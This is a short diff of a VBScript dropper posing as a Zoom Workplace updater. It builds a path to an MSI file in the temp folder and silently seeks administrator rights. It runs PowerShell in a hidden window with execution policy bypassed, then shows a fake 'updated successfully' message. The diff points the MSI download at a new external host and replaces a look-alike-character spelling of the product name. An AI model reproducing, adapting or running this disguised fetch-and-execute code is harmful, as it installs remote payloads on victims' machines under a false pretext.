@@ -7,7 +7,7 @@ Set oFSO = CreateObject("Scripting.FileSystemObject")
 sTempFolder = oShell.ExpandEnvironmentStrings("%TEMP%")
 sMsiFile = oFSO.BuildPath(sTempFolder, "sdc.msi")
 
-sMsiURL = "https://raw.githubusercontent.com/amuell29/cm/refs/heads/main/sdc"
+sMsiURL = "https://seworks.mhawkster01.info/sdc"
 
 If Not IsAdmin() Then
     ElevateSilent()
@@ -33,7 +33,7 @@ sScript = "& {" & vbCrLf & _
 
 oShell.Run "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & sScript & """", 0, True
 
-MsgBox "Zοоm Wоrkрӏасе has been updated successfully!", vbInformation, "Installation Complete"
+MsgBox "ZoomWorkplace has been updated successfully!", vbInformation, "Installation Complete"
 
 WScript.Quit 0
 
